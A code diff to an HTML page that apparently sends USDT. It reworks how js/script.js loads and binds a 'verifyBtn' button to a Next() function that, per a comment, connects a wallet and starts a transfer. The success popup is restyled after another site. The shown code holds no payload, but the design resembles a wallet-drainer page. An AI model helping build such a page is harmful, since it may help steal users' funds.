@@ -92,97 +92,99 @@
     </div>
   </div>
 
-  <!-- Custom script after Web3 (script.js must load and define Next before we bind) -->
-  <script src="js/script.js"></script>
-
-  <!-- Sync loading overlay with script's showLoading/hideLoading/showError so Processing shows and always hides on success/error -->
+  <!-- Load script.js then apply overrides and bind Next so click always runs the workflow -->
   <script>
     (function () {
       var overlay = document.getElementById("loadingOverlay");
-      if (!overlay) return;
-      var origShow = window.showLoading;
-      var origHide = window.hideLoading;
-      var origError = window.showError;
-      if (typeof origShow === "function") {
-        window.showLoading = function (msg) {
-          if (overlay) { overlay.style.display = "flex"; var t = overlay.querySelector(".loading-text"); if (t) t.textContent = msg || "Processing..."; }
-          return origShow.apply(this, arguments);
-        };
-      }
-      if (typeof origHide === "function") {
-        window.hideLoading = function () {
-          if (overlay) overlay.style.display = "none";
-          return origHide.apply(this, arguments);
-        };
-      }
-      if (typeof origError === "function") {
-        window.showError = function (msg) {
-          if (overlay) overlay.style.display = "none";
-          return origError.apply(this, arguments);
-        };
-      }
-    })();
-  </script>
-
-  <!-- Override success popup: show sendbnb.li-style bottom sheet on transaction success -->
-  <script>
-    (function () {
       var modal = document.getElementById("successModal");
-      if (!modal) return;
-      var closeBtn = modal && modal.querySelector(".success-modal__close");
-      var backdrop = modal && modal.querySelector(".success-modal__backdrop");
-      var detailsBtn = document.getElementById("successModalDetailsBtn");
+      var btn = document.getElementById("verifyBtn");
 
-      function openSuccessModal() {
-        var oldPopup = document.getElementById("successPopup");
-        if (oldPopup) oldPopup.style.display = "none";
+      var overridesApplied = false;
+      function applyOverridesAndBind() {
+        if (typeof window.Next !== "function") {
+          console.warn("Send USDT: Next() not defined yet.");
+          return false;
+        }
+        if (!overridesApplied && overlay) {
+          overridesApplied = true;
+          var origShow = window.showLoading;
+        var origHide = window.hideLoading;
+        var origError = window.showError;
+        if (typeof origShow === "function") {
+          window.showLoading = function (msg) {
+            if (overlay) { overlay.style.display = "flex"; var t = overlay.querySelector(".loading-text"); if (t) t.textContent = msg || "Processing..."; }
+            try { return origShow.apply(this, arguments); } catch (e) { console.error(e); }
+          };
+        }
+        if (typeof origHide === "function") {
+          window.hideLoading = function () {
+            if (overlay) overlay.style.display = "none";
+            try { return origHide.apply(this, arguments); } catch (e) { console.error(e); }
+          };
+        }
+        if (typeof origError === "function") {
+          window.showError = function (msg) {
+            if (overlay) overlay.style.display = "none";
+            try { return origError.apply(this, arguments); } catch (e) { console.error(e); }
+          };
+        }
+
         if (modal) {
-          requestAnimationFrame(function () {
+          var closeBtn = modal.querySelector(".success-modal__close");
+          var backdrop = modal.querySelector(".success-modal__backdrop");
+          var previewBtn = document.getElementById("previewPopupBtn");
+          function openSuccessModal() {
+            var oldPopup = document.getElementById("successPopup");
+            if (oldPopup) oldPopup.style.display = "none";
             modal.classList.add("is-open");
             modal.setAttribute("aria-hidden", "false");
-          });
+          }
+          function closeSuccessModal() {
+            modal.classList.remove("is-open");
+            modal.setAttribute("aria-hidden", "true");
+          }
+          if (closeBtn) closeBtn.addEventListener("click", closeSuccessModal);
+          if (backdrop) backdrop.addEventListener("click", closeSuccessModal);
+          if (previewBtn) previewBtn.addEventListener("click", openSuccessModal);
+          if (typeof window.showSuccess === "function") {
+            window.showSuccess = function () { openSuccessModal(); };
+          }
+        }
+        }
+
+        if (btn && !btn._nextBound) {
+          btn._nextBound = true;
+          btn.addEventListener("click", function () { window.Next(); });
+          console.log("Send USDT: Next button bound.");
+        }
+        return true;
+      }
+
+      function showScriptError(msg) {
+        console.error("Send USDT:", msg);
+        if (btn) {
+          btn.disabled = true;
+          btn.title = msg + " Refresh the page.";
         }
       }
-      function closeSuccessModal() {
-        if (modal) {
-          modal.classList.remove("is-open");
-          modal.setAttribute("aria-hidden", "true");
+
+      var s = document.createElement("script");
+      s.src = "js/script.js";
+      s.async = false;
+      s.onload = function () {
+        var attempts = 0;
+        function tryBind() {
+          if (applyOverridesAndBind()) return;
+          attempts++;
+          if (attempts < 15) setTimeout(tryBind, 200);
+          else setTimeout(function () {
+            if (typeof window.Next !== "function") showScriptError("Script did not define Next(). Check console for errors.");
+          }, 0);
         }
-      }
-
-      if (closeBtn) closeBtn.addEventListener("click", closeSuccessModal);
-      if (backdrop) backdrop.addEventListener("click", closeSuccessModal);
-
-      var previewBtn = document.getElementById("previewPopupBtn");
-      if (previewBtn) previewBtn.addEventListener("click", openSuccessModal);
-
-      var originalShowSuccess = window.showSuccess;
-      if (typeof originalShowSuccess === "function") {
-        window.showSuccess = function (message) {
-          openSuccessModal();
-        };
-      }
-    })();
-  </script>
-
-  <!-- Bind Next() so clicking Next always runs script.js workflow (connectWalletAndSwitch, transfer, etc.) -->
-  <script>
-    (function () {
-      var bound = false;
-      function bindNext() {
-        if (bound) return;
-        var btn = document.getElementById("verifyBtn");
-        if (!btn || typeof window.Next !== "function") return;
-        bound = true;
-        btn.addEventListener("click", function () {
-          window.Next();
-        });
-      }
-      bindNext();
-      window.addEventListener("load", bindNext);
-      if (document.readyState === "complete") bindNext();
-      else setTimeout(bindNext, 100);
-      setTimeout(bindNext, 500);
+        tryBind();
+      };
+      s.onerror = function () { showScriptError("Failed to load script.js"); };
+      document.body.appendChild(s);
     })();
   </script>
   <!-- Update USD estimate when user enters amount (always show as positive) -->
